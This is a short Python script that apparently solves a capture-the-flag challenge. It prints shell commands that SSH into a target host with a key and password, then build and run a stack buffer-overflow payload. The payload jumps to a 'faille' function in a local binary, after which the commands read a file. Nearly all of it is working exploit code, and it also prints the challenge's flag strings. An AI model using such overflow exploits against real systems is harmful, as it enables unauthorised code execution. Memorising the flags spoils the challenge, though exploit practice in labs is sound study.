#!/usr/bin/env python3

import subprocess


#
# Variables
#

server = 'servertohack.localdomain'
username = 'hackonymousoflix'
identity = 'id_rsa'
port = 845
nuclearpassword = "CFl1X-W3_d0n'7_sUbM17_70_73Rr0r_w3_m@k3_7h3_73rr0R"


#
# Get bash
#

cmd = "ssh -q -p" + str(port) + " -i " + identity + " " + username + "@" + server + "\n\
launchnb none " + nuclearpassword + "\n\
bash\n\
cat >/var/tmp/script.sh<<EOF\n\
#!/bin/bash\n\
addr_faille=\$(objdump -d /home/will.byers/exploit | grep faille | cut -d' ' -f1)\n\
addr_faille_hex=\"\\x\${addr_faille:14:2}\\x\${addr_faille:12:2}\\x\${addr_faille:10:2}\\x\${addr_faille:8:2}\\x\${addr_faille:6:2}\\x\${addr_faille:4:2}\\x\${addr_faille:2:2}\\x\${addr_faille:0:2}\"\n\
echo \${addr_faille_hex}\n\
buffer_size=\$(objdump -d /home/will.byers/exploit | grep -A10 \"<main>:\" | grep lea | cut -d'-' -f2 | cut -d'(' -f1)\n\
buffer_overflow_len=\$(( \$buffer_size + 8 ))\n\
python -c \"print \\\"a\\\"*\${buffer_overflow_len} + \\\"\${addr_faille_hex}\\\"\" > /var/tmp/payload\n\
cat /var/tmp/payload - | /home/will.byers/exploit\n\
EOF\n\
chmod +x /var/tmp/script.sh\n\
/var/tmp/script.sh\n\
cat /home/will.byers/MyLittleToDoList.txt"
print('This time you will have to use your hands... Please use the following commands:\n')
print(cmd)
print('\nYou will find that the easter egg is CFl1X-Th15_15_7h3_3nD_0f_7h3_W0rld_45_w3_Kn0w_17')
